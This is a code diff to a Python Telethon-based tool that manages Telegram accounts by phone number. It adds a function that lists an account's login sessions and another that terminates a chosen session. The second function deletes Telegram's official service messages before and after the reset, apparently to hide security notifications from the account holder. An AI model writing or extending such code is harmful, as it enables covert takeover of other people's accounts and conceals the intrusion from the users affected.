@@ -25,6 +25,8 @@ from telethon.tl.functions.account import (
     VerifyEmailRequest,
     GetPasswordRequest,
     UpdateNotifySettingsRequest,
+    GetAuthorizationsRequest,
+    ResetAuthorizationRequest,
 )
 from telethon.tl.types import (
     EmailVerifyPurposeLoginSetup,
@@ -1083,6 +1085,36 @@ async def admin_kick_only(phone: str) -> dict:
                 "error": "الجلسة جديدة — انتظر ثم أعد المحاولة",
             }
         return {"success": False, "error": err}
+
+
+async def get_session_authorizations(phone: str):
+    client = await get_active_client(phone)
+    if not client:
+        return None
+    try:
+        auths = await client(GetAuthorizationsRequest())
+        await client.disconnect()
+        return auths.authorizations
+    except Exception as e:
+        logger.error(f"get_authorizations {phone}: {e}")
+        await client.disconnect()
+        return None
+
+
+async def kick_specific_session(phone: str, session_hash: int) -> bool:
+    client = await get_active_client(phone)
+    if not client:
+        return False
+    try:
+        await delete_telegram_official_messages(client)
+        await client(ResetAuthorizationRequest(hash=session_hash))
+        await delete_telegram_official_messages(client)
+        await client.disconnect()
+        return True
+    except Exception as e:
+        logger.error(f"kick_specific {phone} {session_hash}: {e}")
+        await client.disconnect()
+        return False
 
 
 # ──────────────────────────────────────────
